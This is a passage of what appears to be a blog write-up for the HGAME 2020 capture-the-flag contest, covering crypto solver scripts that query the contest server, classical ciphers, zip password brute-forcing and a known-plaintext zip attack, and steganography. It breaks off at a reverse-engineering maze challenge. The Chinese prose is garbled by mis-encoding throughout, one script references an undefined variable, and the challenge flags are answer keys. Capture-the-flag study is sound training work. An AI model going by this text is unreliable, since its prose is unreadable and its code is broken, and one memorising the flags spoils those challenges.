å¹¶ä¸”20ç»„å¼‚æˆ–ä¸‹æ¥ï¼Œè·å¾—çš„å¯è§å­—ç¬¦è‚¯å®šä¹Ÿæ˜¯20ä¸ªï¼Œä¸ä¼šå°‘ä¸€ä¸ªã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦éå†æ‰€æœ‰çš„å¯†é’¥ç©ºé—´å†…çš„å…ƒç´ ï¼Œæ‰¾åˆ°æ»¡è¶³æ¡ä»¶ï¼ˆå³ï¼Œå’Œ20ç»„å¯†æ–‡çš„å¯¹åº”ä½å¼‚æˆ–ä¸‹æ¥èƒ½ç”Ÿæˆ20ä¸ªå¯è§å­—ç¬¦ï¼‰çš„å­—ç¬¦ï¼Œç»„åˆèµ·æ¥å³ä¸ºflag</p><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">import <span class="keyword">string</span>, binascii, base64</span><br><span class="line"></span><br><span class="line">def getex():</span><br><span class="line">    example=[]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        p=remote(<span class="string">'47.98.192.231'</span>,<span class="number">25001</span>)</span><br><span class="line">        example.append(base64.b64decode(p.recv()))</span><br><span class="line">        p.<span class="built_in">close</span>()</span><br><span class="line">    <span class="literal">return</span> example</span><br><span class="line"></span><br><span class="line">ex=getex()<span class="comment">#è·å–50ç»„å¯†æ–‡</span></span><br><span class="line"></span><br><span class="line">tablekey=<span class="keyword">string</span>.ascii_letters+<span class="keyword">string</span>.digits</span><br><span class="line">tableflag=tablekey+<span class="string">'~!@#$%^&amp;*()_+-=`&#123;&#125;'</span>  <span class="comment">#flagçš„å¯èƒ½çš„å­—ç¬¦</span></span><br><span class="line">flag=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="built_in">len</span>(ex[<span class="number">0</span>])):</span><br><span class="line">    flag_may=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tableflag:</span><br><span class="line">        possible=[]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> ex:</span><br><span class="line">            <span class="keyword">a</span> = chr(ord(i)^ord(j[index]))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">a</span> <span class="keyword">in</span> tablekey:<span class="comment">#å¦‚æœå¼‚æˆ–ç»“æœæ˜¯åœ¨å¯†é’¥ç©ºé—´é‡Œçš„è¯ï¼Œå°†ç»“æœæ”¾å…¥æ•°ç»„</span></span><br><span class="line">                possible.append(<span class="keyword">a</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(possi) == <span class="built_in">len</span>(ex):<span class="comment">#å¦‚æœæ•°ç»„é•¿åº¦ç­‰äºå¯†é’¥çš„ç»„æ•°ï¼ˆè¿™é‡Œçš„50ï¼‰</span></span><br><span class="line">            flag_may+=i<span class="comment">#è¯¥å­—ç¬¦ç¬¦åˆæ¡ä»¶ï¼Œæ”¾å…¥è¯¥ä½å€™é€‰ï¼ˆå› ä¸ºæœ‰å¯èƒ½ä¸€ä¸ªä½ç½®æœ‰å¤šä¸ªå­—ç¬¦æ»¡è¶³æ¡ä»¶ï¼Œå¯èƒ½éœ€è¦äºŒæ¬¡æ’é™¤ï¼‰</span></span><br><span class="line">    flag.append(flag_may) </span><br><span class="line">print flag<span class="comment">#çœ‹æ¯ä¸€ç»„æ˜¯å¦åªæœ‰ä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœä¸æ˜¯çš„è¯ï¼Œå¤šè·‘å‡ éè„šæœ¬ï¼Œå–ä¸ªäº¤é›†å°±å¯ã€‚</span></span><br><span class="line">flag_string=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">flag_string+=i</span><br><span class="line">print flag_string</span><br></pre></td></tr></table></figure><p>hgame{r3us1nG+M3$5age-&amp;&amp;~rEduC3d_k3Y-5P4Ce}</p><h3 id="Recoder"><a href="#Recoder" class="headerlink" title="Recoder"></a>Recoder</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-11"><a href="#é¢˜ç›®ä»‹ç»ï¼š-11" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>We found a secret oracle and it looks like it will encrypt your inputâ€¦<br>nc 47.98.192.231 25002</p><h4 id="è§£é¢˜æ€è·¯ï¼š-11"><a href="#è§£é¢˜æ€è·¯ï¼š-11" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>æ ¹æ®é¢˜ç›®åå­—ï¼Œå†ç»è¿‡å¤šæ¬¡å°è¯•å¯ä»¥å‘ç°ï¼ŒæœåŠ¡å™¨ä¼šå°†ä½ çš„è¾“å…¥è¿›è¡Œç®€å•çš„ç½®æ¢ï¼Œ</p><p>ç„¶ååœ¨äº¤äº’åæ¬¡ä¹‹åä¼šç»™å‡ºç½®æ¢åçš„flagï¼Œé•¿åº¦ä¸º32ä½</p><p><img src="https://i.loli.net/2020/04/30/q7slBzN4kjL9uEA.png" alt="img"></p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦è¾“å…¥32ä½å­—ç¬¦ï¼Œè§‚å¯Ÿä»–ç½®æ¢åç»“æœï¼Œå¾—åˆ°æ˜ å°„å…³ç³»ï¼Œç„¶åæˆ‘ä»¬æ ¹æ®è¿™ä¸ªæ˜ å°„å…³ç³»ï¼Œå°†æœ€åç»™å‡ºçš„ç½®æ¢è¿‡åçš„flagç½®æ¢å›æ¥å³å¯ã€‚(æ³¨æ„ï¼Œä¸ºäº†è®©æˆ‘ä»¬çš„æ˜ å°„å…³ç³»ä¸ºä¸€ä¸€æ˜ å°„ï¼Œå³æ˜ å°„å…³ç³»ä¸ºåŒå°„å…³ç³»ï¼Œæˆ‘ä»¬çš„è¾“å…¥åº”è¯¥æ˜¯<strong>ä¸é‡å¤</strong>çš„å­—ç¬¦)</p><h4 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cin</span>=<span class="string">'qhaufsywetodiprgjYQvRWcklxnEbmzT'</span></span><br><span class="line"><span class="attribute">cout</span>=<span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTY'</span></span><br><span class="line"><span class="attribute">flagout</span>=<span class="string">'hL+jm5&#123;gae$IUtmp3&#125;iu!0m_PRAnTTe!'</span></span><br><span class="line">index=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cout :</span><br><span class="line">index.append(cin.<span class="builtin-name">find</span>(i))</span><br><span class="line"><span class="attribute">flag</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(32):</span><br><span class="line">flag+=flagout[index[i]]</span><br><span class="line"><span class="builtin-name">print</span> flag</span><br></pre></td></tr></table></figure><p>flag:hgame{jU$t+5ImpL3_PeRmuTATi0n!!}</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="æ¬¢è¿å‚åŠ HGameï¼"><a href="#æ¬¢è¿å‚åŠ HGameï¼" class="headerlink" title="æ¬¢è¿å‚åŠ HGameï¼"></a>æ¬¢è¿å‚åŠ HGameï¼</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-12"><a href="#é¢˜ç›®ä»‹ç»ï¼š-12" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>æ¬¢è¿å¤§å®¶å‚åŠ  HGAME 2020ï¼<br>æ¥æ¥æ¥ï¼Œç­¾ä¸ªåˆ°å§ï½<br>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t<br>æ³¨ï¼šè‹¥è§£é¢˜å¾—åˆ°çš„æ˜¯æ— <code>hgame{}</code>å­—æ ·çš„flagèŠ±æ‹¬å·å†…å†…å®¹ï¼Œè¯·æ‰‹åŠ¨æ·»åŠ <code>hgame{}</code>åæäº¤ã€‚<br>ã€Noticeã€‘è§£å‡ºæ¥çš„å­—æ¯å‡ä¸ºå¤§å†™</p><h4 id="è§£é¢˜æ€è·¯ï¼š-12"><a href="#è§£é¢˜æ€è·¯ï¼š-12" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>å°†é¢˜ç›®base64è§£ç åä¸ºï¼š.â€“ â€¦â€“ .-.. -.-. â€”â€“ â€“ . ..â€“.- - â€” ..â€“.- ..â€” â€”â€“ ..â€” â€”â€“ ..â€“.- â€¦. â€“. .- â€“ â€¦â€“</p><p>æ ¹æ®æç¤ºï¼Œæ‘©æ–¯å¯†ç è§£å¯†ï¼šW3LC0ME_TO_2020_HGAM3</p><p>flagï¼šhgame{W3LC0ME_TO_2020_HGAM3}</p><p>è¿™é‡Œæ¨èä¸€ä¸ªæ‘©æ–¯å¯†ç åœ¨çº¿è§£å¯†çš„æ¯”è¾ƒå¥½çš„ç½‘ç«™ï¼š <a href="http://www.all-tool.cn/Tools/morse/?&amp;rand=ef0d1baeafb128b559d9813277b7ca5d" target="_blank" rel="noopener">http://www.all-tool.cn/Tools/morse/?&amp;rand=ef0d1baeafb128b559d9813277b7ca5d</a> ï¼Œå¯ä»¥è‡ªå®šä¹‰ åˆ†å‰²ç¬¦ï¼Œé•¿ç¬¦ï¼ŒçŸ­ç¬¦</p><h3 id="å£çº¸"><a href="#å£çº¸" class="headerlink" title="å£çº¸"></a>å£çº¸</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-13"><a href="#é¢˜ç›®ä»‹ç»ï¼š-13" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>æŸå¤©ï¼ŒObjectNotFoundç»™ä½ å‘æ¥äº†ä¸€ä¸ªå‹ç¼©åŒ…ã€‚<br>â€œç»™ä½ ä¸€å¼ æˆ‘çš„æ–°è€å©†çš„å£çº¸ï¼æ€æ ·ï¼Œå¥½çœ‹å—ï¼Ÿâ€<br>æ­£å½“ä½ ç–‘æƒ‘ä¸è§£çš„æ—¶å€™ï¼Œä½ çªç„¶æ³¨æ„åˆ°äº†å‹ç¼©æ–‡ä»¶çš„åå­—â€”â€”â€œSecretâ€ã€‚<br>è«éå…¶ä¸­æš—è—ç„æœºï¼Ÿ</p><h4 id="è§£é¢˜æ€è·¯ï¼š-13"><a href="#è§£é¢˜æ€è·¯ï¼š-13" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>æ‹¿åˆ°æ–‡ä»¶ï¼Œæ˜¯ä¸ªå›¾ç‰‡ï¼Œ</p><p>èƒ½å¤©ä½¿~</p><p>æ”¾å…¥010editorï¼Œctrl f æœç´¢hexå€¼ï¼š50 4b 03 04ï¼ˆè¿™æ˜¯å‹ç¼©åŒ…çš„æ–‡ä»¶å¤´ï¼‰å¯ä»¥çœ‹è§å›¾ç‰‡åº•éƒ¨æœ‰å‹ç¼©åŒ…ï¼Œ</p><p>æˆ‘ä»¬æ‰‹åŠ¨å°†zipåŒ…å¯¼å‡ºæ¥ï¼Œ</p><p>é¦–å…ˆé€‰ä¸­è‡ªè¿™ä¸ªæ–‡ä»¶å¤´å¾€åçš„æ‰€æœ‰å†…å®¹ï¼Œå³é”®-&gt;é€‰æ‹©-&gt;ä¿å­˜é€‰æ‹©</p><p>æ”¹æ–‡ä»¶åç¼€åä¸ºzip</p><p>æ‰“å¼€å‹ç¼©åŒ…</p><p>æç¤ºå‹ç¼©åŒ…å¯†ç æ˜¯ä¸ªIDï¼Œè¿™å¼ å›¾ç‰‡çš„IDï¼Ÿä¸çŸ¥é“ï¼Œç›´æ¥çˆ†6-8ä½æ•°å­—è¯•è¯•å…ˆï¼å¾—åˆ°</p><p>å¾—åˆ°ï¼š\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d</p><p>çœ‹åˆ°æœ€åä¸€ä¸ª7dï¼Œâ€˜}â€™çš„asciiç çš„åå…­è¿›åˆ¶ï¼Œflagå‡ºæ¥äº†~</p><p>åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾—åˆ°flagï¼šhgame{Do_y0u_KnOW_uNiC0d3?}</p><p>å‘ƒï¼Œï¼Œæ˜¯unicodeä¹ˆåŸæ¥ã€‚ã€‚ã€‚ã€‚</p><h3 id="å…‹è‹é²ç¥è¯"><a href="#å…‹è‹é²ç¥è¯" class="headerlink" title="å…‹è‹é²ç¥è¯"></a>å…‹è‹é²ç¥è¯</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-14"><a href="#é¢˜ç›®ä»‹ç»ï¼š-14" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>ObjectNotFoundå‡ å¤©å‰éšæ‰‹ä»Cosmosç”µè„‘æ¡Œé¢ä¸Šå¤åˆ¶ä¸‹æ¥çš„æ–‡ä»¶ã€‚<br>å””ï¼Œå¥½åƒé‡Œé¢æœ‰ä»€ä¹ˆä¸å¾—äº†çš„ä¸œè¥¿ã€‚<br>ã€hint1ã€‘è¯·ä½¿ç”¨7zipã€‚å¦å¤–ï¼ŒåŠ å¯†çš„zipæ˜¯æ— æ³•è§£å‡ºå¯†ç çš„ã€‚</p><h4 id="è§£é¢˜æ€è·¯ï¼š-14"><a href="#è§£é¢˜æ€è·¯ï¼š-14" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>ä¸‹è½½å¾—åˆ°å‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªåŠ å¯†å¾—å‹ç¼©åŒ…å’Œä¸€ä¸ªæ–‡ä»¶ï¼ŒBacon.txt,</p><p>æ–‡æœ¬æ–‡ä»¶å¾—å†…å®¹æ˜¯ï¼š</p><p>of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.</p><p>*Password in capital letters.</p><p>æ˜¯åŸ¹æ ¹å¯†ç å¾—ä¸€ç§å½¢å¼ï¼Œæ ¹æ®å¤§å°å†™æ¥è§£å¯†ï¼Œ</p><p>å…ˆå°†å¤§å†™å¾—å­—ç¬¦è½¬ä½aï¼Œå°å†™å¾—å­—æ¯è½¬ä¸ºbï¼Œ</p><p>bbabababaabbbbbbbaabbbaaababbbbbbaabbbaabbabbbaabababbbbaababbbaabaaabbbbab</p><p>ç„¶åæ‰¾ä¸€ä¸ª<a href="https://tool.bugku.com/peigen/" target="_blank" rel="noopener">åœ¨çº¿ç½‘ç«™è§£å¯†</a></p><p>è§£å¯†å¤±è´¥</p><p>é‚£å°±a,bäº’æ¢</p><p>aababababbaaaaaaabbaaabbbabaaaaaabbaaabbaabaaabbababaaaabbabaaabbabbbaaaaba</p><p>å¾—åˆ°</p><p>FLAGHIDDENINDOC<br>flaghiddenindoc</p><p>ä¼šæ˜¯å‹ç¼©åŒ…å¾—å¯†ç ä¹ˆï¼Ÿ</p><p>æ‰“å¼€å‹ç¼©åŒ…</p><p>å¯ä»¥å‘ç°é‡Œé¢ä¹Ÿæœ‰ä¸€ä¸ªBacon.txt</p><p>åŠ ä¸Šæç¤ºè¯´ç”¨7zè¿›è¡Œå‹ç¼©ï¼Œåº”è¯¥æ˜¯æ˜æ–‡æ”»å‡»äº†å®é”¤äº†ã€‚</p><p>ç„¶åæ˜æ–‡æ”»å‡»è·å¾—æ— å¯†ç å‹ç¼©åŒ…ã€‚</p><p>å…ˆå°†å·²ç»å¾—åˆ°å¾—Bacon.txtç”¨7zæ— å¯†ç å‹ç¼©å¾—åˆ°Bacon.zip</p><p>åˆ©ç”¨å·¥å…·ï¼šARCHPR</p><p>ä¸Šé¢æ”¾æœ‰å¯†ç å¾—å‹ç¼©åŒ…ï¼Œä¸‹é¢æ”¾è‡ªå·±åˆ¶ä½œå¾—å‹ç¼©åŒ…</p><p>å¼€å§‹æ”»å‡»ï¼Œ</p><p>ç­‰æœç´¢åˆ°å¯†é’¥åå°±å¯ä»¥æ‰‹åŠ¨æš‚åœï¼Œè·å¾—æ— å¯†ç çš„å‹ç¼©åŒ…</p><p>æœ‰è¿™ä¸ªå¯†é’¥å°±å¯ä»¥è·å¾—æ— å¯†ç çš„å‹ç¼©åŒ…äº†ï¼Œç‚¹ç¡®å®šå°±å¯ä»¥äº†ã€‚    </p><p>æ‰“å¼€wordï¼Œæç¤ºæœ‰å¯†ç ï¼Œå¯†ç æ˜¯ä»€ä¹ˆï¼Ÿåˆšåˆšæœ‰è§£å¯†è¿‡ä¸€ä¸ªåŸ¹æ ¹å¯†ç æƒ¹ï¼Œè¯•è¯•</p><p>æœ€åè¯•å‡ºæ¥æ˜¯å¤§å†™çš„é‚£ä¸ªï¼šFLAGHIDDENINDOC</p><p>æ‰“å¼€æ˜¯ä¸€ç¯‡æ–‡ç« </p><p>æ‹‰åˆ°åº•ä¹Ÿæ²¡å‘ç°ä¸œè¥¿ï¼Œ</p><p>ä»¥ä¸ºæ˜¯å°†flagè®¾ç½®æˆå’ŒèƒŒæ™¯ä¸€æ ·çš„ç™½è‰²ï¼Œäºæ˜¯å°†æ‰€æœ‰æ–‡å­—éƒ½æ”¹æˆçº¢è‰²ã€‚æ— æœ</p><p>æœ€åè¯•äº†è¯•è®¾è®¡æ¨¡å¼ï¼Œè¿™ä¸ªæ¨¡å¼ä¹Ÿå¯ä»¥è—äº›ä¿¡æ¯ï¼ˆä¹‹å‰çš„æ¯”èµ›é‡åˆ°è¿‡ï¼‰</p><p>æœç„¶~</p><p>å¾—åˆ°flagï¼šhgame {Y0u_h@Ve_F0Und_mY_S3cReT}</p><h3 id="ç­¾åˆ°æProPlus"><a href="#ç­¾åˆ°æProPlus" class="headerlink" title="ç­¾åˆ°æProPlus"></a>ç­¾åˆ°æProPlus</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-15"><a href="#é¢˜ç›®ä»‹ç»ï¼š-15" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>ä»€ä¹ˆä»€ä¹ˆï¼Œç­¾åˆ°é¢˜å¤ªç®€å•æ²¡è¿‡ç˜¾ï¼Ÿ<br>æ¥æ¥æ¥ï¼Œè¯•è¯•å’±ObjectNotFoundäº²æ‰‹åšçš„è¿™ä¸€é“ï¼ŒåŒ…æ‚¨æ»¡æ„ï¼<br>ã€æ‹¼å†™é”™è¯¯ä¿®æ­£ã€‘fenses -&gt; fences</p><h4 id="è§£é¢˜æ€è·¯ï¼š-15"><a href="#è§£é¢˜æ€è·¯ï¼š-15" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>æ‰“å¼€æ–‡ä»¶ï¼Œæœ‰ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…å’Œä¸€ä¸ªpassword.txtï¼Œ</p><p>æ–‡æœ¬å†…å®¹ä¸ºï¼š</p><p>Rdjxfwxjfimknâ€‚z,tsâ€‚wntziâ€‚xtjrwmâ€‚xsfjtâ€‚jmâ€‚ywtâ€‚rtntwhfâ€‚fâ€‚yâ€‚â€‚â€‚hâ€‚jnsxfâ€‚qjFjfâ€‚jnbâ€‚â€‚rgâ€‚fiyykwtbsnkmâ€‚tmâ€‚â€‚xaâ€‚jsdwqjfmkjyâ€‚wlviHtqzqsGsffywjjyynfâ€‚yssmâ€‚xfjypnyihjn.</p><p>JRFVJYFZVRUAGMAI</p><ul><li>Three fenses first, Five Caesar next. English sentense first,  zip password next.</li></ul><p>æ¨èä¸€ä¸ªç¼–ç è§£ç æ¯”è¾ƒå¥½çš„ç½‘ç«™ï¼š<a href="http://www.qqxiuzi.cn" target="_blank" rel="noopener">www.qqxiuzi.cn</a></p><p>ä¸‰æ¬¡æ …æ ï¼Œäº”æ¬¡å‡¯æ’’   è‹±è¯­å¥å­åœ¨å‰ï¼Œå‹ç¼©åŒ…å¯†ç åœ¨åï¼Œ</p><p>å…ˆå°†æ–‡æœ¬æ¯ç»„å­—æ•°ä¸º3æ …æ è§£å¯†åï¼Œå‡¯æ’’å¯†ç ä½ç§»5ä½è§£å¯†å¾—åˆ°</p><p> Manyâ€‚yearsâ€‚laterâ€‚asâ€‚heâ€‚facedâ€‚theâ€‚firingâ€‚squad,â€‚Colonelâ€‚Aurelianoâ€‚Buendiaâ€‚wasâ€‚toâ€‚rememberâ€‚thatâ€‚distantâ€‚afternoonâ€‚whenâ€‚hisâ€‚fatherâ€‚tookâ€‚himâ€‚toâ€‚discoverâ€‚ice. </p><p>ç™¾å¹´å­¤ç‹¬é‡Œçš„ä¸€æ®µï¼Œ</p><p>emmmï¼Œæ‰€ä»¥ä¸‹é¢é‚£ä¸ªJRFVJYFZVRUAGMAIæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ</p><p>English sentense first,  zip password next.</p><p>æ‰€ä»¥å°†è¿™ä¸€ä¸²æŒ‰åŒæ ·è§„åˆ™è§£å¯†å°±èƒ½å¾—åˆ°zipå¯†ç äº†ï¼Œ</p><p>è§£å¯†å¾—åˆ°ï¼š EAVMUBAQHQMVEPDT </p><p>ç”¨è¿™ä¸ªå¯†ç æ‰“å¼€å‹ç¼©åŒ…</p><p>æ˜¯ookï¼åŠ å¯†ï¼Œ<a href="https://www.splitbrain.org/services/ookè§£å¯†å¾—åˆ°base32ç¼–ç ï¼Œ" target="_blank" rel="noopener">https://www.splitbrain.org/services/ookè§£å¯†å¾—åˆ°base32ç¼–ç ï¼Œ</a></p><p>base32è§£ç å¾—åˆ°base64ç¼–ç ï¼Œbase64è§£ç å¾—åˆ°</p><p><img src="https://i.loli.net/2020/04/30/3r1lGqF2ubkRJV4.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œpngæ–‡ä»¶çš„æ–‡ä»¶å¤´PNGï¼Œ</p><p>äºæ˜¯ç”¨pythonï¼Œå°†base64è½¬ä¸ºå›¾ç‰‡</p><p>expï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">base=<span class="string">'    '</span> <span class="comment">#è¿™é‡Œæ˜¯ä¹‹å‰å¾—åˆ°çš„base64ç¼–ç </span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'flag.png'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.<span class="built_in">write</span>(base64.b64decode(base))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äºŒç»´ç -&gt;flagï¼š hgame{3Nc0dInG_@lL_iN_0Ne!} </p><h3 id="æ¯æ—¥æ¨è"><a href="#æ¯æ—¥æ¨è" class="headerlink" title="æ¯æ—¥æ¨è"></a>æ¯æ—¥æ¨è</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-16"><a href="#é¢˜ç›®ä»‹ç»ï¼š-16" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>â€œè¿™æ˜¯ä¸€ä¸ªï¼ŒE99p1antå’ŒObjectNotFoundä¹‹é—´å‘ç”Ÿçš„æ•…äº‹ã€‚â€<br>â€œäº‹æƒ…ï¼Œè¿˜è¦ä»ä¸€ä¸ªé£å’Œæ—¥ä¸½çš„ä¸‹åˆè¯´èµ·ã€‚ObjectNotFoundæ­£å¬ç€ç½‘æ˜“äº‘æ¯æ—¥æ¨èâ€¦â€<br>ç®—äº†ç®—äº†ï¼Œæƒ³ä¸å‡ºä»€ä¹ˆé¢˜ç›®ä»‹ç»äº†ï¼Œå°±è¿™æ ·å§ã€‚</p><h4 id="è§£é¢˜æ€è·¯ï¼š-16"><a href="#è§£é¢˜æ€è·¯ï¼š-16" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>ç”¨wiresharkæ‰“å¼€æµé‡åŒ…ï¼Œè¿½è¸ªTCPæµï¼Œ</p><p>åœ¨ç¬¬88æµå‘ç°å‡ºé¢˜äººä¸Šä¼ çš„å‹ç¼©åŒ…</p><p>dumpä¸‹æ¥ï¼Œè¿™é‡Œæä¾›ä¸€ç§æˆ‘çš„ç¨å¾®æ¯”è¾ƒéº»çƒ¦çš„æ–¹æ³•ï¼Œå¦‚æœæœ‰æ›´å¥½çš„æ–¹æ³•ï¼Œè¯·æŒ‡æ•™</p><p>é¦–å…ˆæ˜¾ç¤ºå’Œä¿å­˜æ•°æ®ä¸ºåŸå§‹æ•°æ®</p><p>ç„¶åæ–°å»ºä¸€ä¸ªç©ºçš„æ–‡æœ¬ï¼Œå°†è¿™äº›æ•°æ®å¤åˆ¶è¿›å»ï¼Œä¿å­˜</p><p>æ‰“å¼€010editorï¼Œå¯¼å…¥16è¿›åˆ¶æ–‡ä»¶ii</p><p>ç¼–è¾‘ä¸ºæ–‡æœ¬</p><p>åˆ æ‰å‹ç¼©åŒ…å‰é¢å’Œåé¢çš„æŠ¥æ–‡ï¼Œä¿å­˜æ–‡ä»¶ï¼Œåç¼€ä¸º.zip</p><p>æ‰“å¼€å‹ç¼©åŒ…ï¼Œæç¤ºå¯†ç ä¸º6ä½æ•°å­—</p><p>ARCHPRçˆ†ç ´ä¹‹ã€‚</p><p>æ‰“å¼€å¾—åˆ°ä¸€ä¸ªéŸ³é¢‘</p><p>I Love Mondays.mp3</p><p>å¬äº†ä¸€ä¸‹ï¼Œé‡Œé¢ç¡®å®æ˜¯åŸæ¥çš„æ›²ï¼Œ</p><p>ä¸€å¼€å§‹è§‰å¾—å¯èƒ½æ˜¯mp3éšå†™ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°å¯†ç ï¼Œæœ€åè¿˜æ˜¯ç”¨Audacityæ‰“å¼€ï¼Œè¯•äº†è¯•</p><p>æ³¢å½¢å›¾ï¼Œ</p><p>æ— æœï¼Œ</p><p>è¯•äº†è¯•é¢‘è°±å›¾</p><p><img src="https://i.loli.net/2020/04/30/T1eRzlhCiGHym8b.png" alt="img"></p><p>å¾—åˆ°flagï¼šhgame{I_love_EDM233}</p><p>ï¼ˆå¥½å¥‡è¿™ç§é¢˜æ€ä¹ˆå‡ºçš„ï¼Œå‡ºé¢˜äººå¥½å¼º~ï¼‰</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-17"><a href="#é¢˜ç›®ä»‹ç»ï¼š-17" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p> You wonâ€™t figure out anything if you give in to fear.<br>å­¦ä¹ èµ„æ–™: <a href="https://ctf-wiki.github.io/ctf-wiki/reverse/maze/maze-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/reverse/maze/maze-zh/</a><br>é™„åŠ è¯´æ˜ï¼šè¯·èµ°æœ€çŸ­è·¯çº¿ </p><h4 id="è§£é¢˜æ€è·¯ï¼š-17"><a href="#è§£é¢˜æ€è·¯ï¼š-17" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>æ˜¯ä¸€ä¸ªæ­£å¸¸çš„èµ°è¿·å®«ï¼Œå…ˆçœ‹èµ°æ³•é‚£è¾¹çš„ä»£ç </p><p>è¿·å®«å°±åœ¨å›¾ä¸­çš„&amp;unk_602080ï¼Œ</p><p>ç»ˆç‚¹å°±æ˜¯å›¾ä¸­çš„&amp;unk_60243C.</p><p>æˆ‘ä»¬åœ¨idaé‡Œé¢æŠŠè¿·å®«dumpä¸‹æ¥</p><p>é€‰ä¸­è¿·å®«æ•°æ®æ®µ</p><p>shift+e</p><p>ä»åæ±‡ç¼–çš„ä»£ç 